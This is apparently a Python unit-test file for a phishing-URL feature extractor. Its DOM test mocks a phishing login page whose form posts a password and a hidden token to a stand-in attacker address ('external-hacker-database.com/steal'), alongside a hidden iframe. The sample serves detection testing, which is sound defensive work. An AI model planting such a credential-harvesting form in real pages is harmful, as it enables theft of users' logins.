import unittest
from unittest.mock import patch, MagicMock
import os
import sys

# Append backend/app to PYTHONPATH so we can import services
sys.path.append(os.path.join(os.path.dirname(os.path.dirname(__file__)), "backend"))

from app.services.extractor import extract_features, is_ip

class TestExtractor(unittest.TestCase):

    def test_is_ip(self):
        self.assertEqual(is_ip("192.168.1.1"), 1)
        self.assertEqual(is_ip("2001:0db8:85a3:0000:0000:8a2e:0370:7334"), 1)
        self.assertEqual(is_ip("google.com"), 0)
        self.assertEqual(is_ip("paypal-login.net"), 0)

    def test_lexical_features(self):
        # Scan standard URL lexical parsing
        url = "https://sub.secure-login-bank.com/signin?ref=123&user=admin"
        features = extract_features(url)
        
        self.assertEqual(features['IsHTTPS'], 1)
        self.assertEqual(features['URLLength'], len(url))
        self.assertEqual(features['DomainLength'], len("sub.secure-login-bank.com"))
        self.assertEqual(features['NoOfSubDomain'], 1) # 'sub' is subdomain
        self.assertEqual(features['NoOfEqualsInURL'], 2)
        self.assertEqual(features['NoOfQMarkInURL'], 1)
        self.assertEqual(features['NoOfAmpersandInURL'], 1)

    @patch("httpx.Client.get")
    def test_dom_features(self, mock_get):
        # Mock responsive HTML source code
        mock_html = """<!DOCTYPE html>
        <html>
        <head>
            <title>My mybank Login</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link rel="shortcut icon" href="/favicon.ico">
            <link rel="stylesheet" href="/style.css">
            <script src="/script.js"></script>
        </head>
        <body>
            <img src="/logo.png">
            <iframe src="/hidden-loader"></iframe>
            <form action="https://external-hacker-database.com/steal" method="POST">
                <input type="hidden" name="token" value="abc">
                <input type="password" name="pwd">
                <input type="submit" value="Submit">
            </form>
            <a href="https://facebook.com/share">Share on Facebook</a>
            <a href="#">Placeholder</a>
            <a href="/login.php">Self ref</a>
        </body>
        </html>
        """
        
        # Setup mock response
        mock_response = MagicMock()
        mock_response.text = mock_html
        mock_response.history = []
        mock_get.return_value = mock_response

        url = "http://mybank.com/signin"
        features = extract_features(url)

        self.assertEqual(features['IsHTTPS'], 0) # http scheme
        self.assertEqual(features['HasTitle'], 1)
        self.assertEqual(features['DomainTitleMatchScore'], 1) # 'mybank' matches 'My Bank Login'
        self.assertEqual(features['HasFavicon'], 1)
        self.assertEqual(features['IsResponsive'], 1) # viewport exists
        self.assertEqual(features['NoOfiFrame'], 1)
        
        # Counts
        self.assertEqual(features['NoOfImage'], 1)
        self.assertEqual(features['NoOfCSS'], 1)
        self.assertEqual(features['NoOfJS'], 1)
        self.assertEqual(features['HasPasswordField'], 1)
        self.assertEqual(features['HasHiddenFields'], 1)
        self.assertEqual(features['HasExternalFormSubmit'], 1)
        self.assertEqual(features['HasSocialNet'], 1)
        self.assertEqual(features['Bank'], 1) # "bank" is in title/html

        # Links
        self.assertEqual(features['NoOfEmptyRef'], 1) # '#'
        self.assertEqual(features['NoOfSelfRef'], 1) # '/login.php'
        self.assertEqual(features['NoOfExternalRef'], 1) # 'facebook.com'

if __name__ == "__main__":
    unittest.main()
